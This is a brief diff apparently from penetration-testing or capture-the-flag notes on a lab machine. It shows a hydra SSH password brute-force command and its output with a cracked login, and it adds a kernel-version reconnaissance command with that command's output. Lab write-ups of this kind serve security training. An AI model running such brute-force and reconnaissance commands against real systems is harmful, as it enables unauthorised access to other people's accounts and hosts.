@@ -176,3 +176,7 @@ elly
 
 hydra -L users.txt -e nsr ssh://192.168.1.92 -v
   [22][ssh] host: 192.168.1.92   login: SHayslett   password: SHayslett
+
+cat /proc/version
+  Linux version 4.4.0-21-generic (buildd@lgw01-06) (gcc version 5.3.1 20160413 (Ubuntu 5.3.1-14ubuntu2) ) #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016
+  
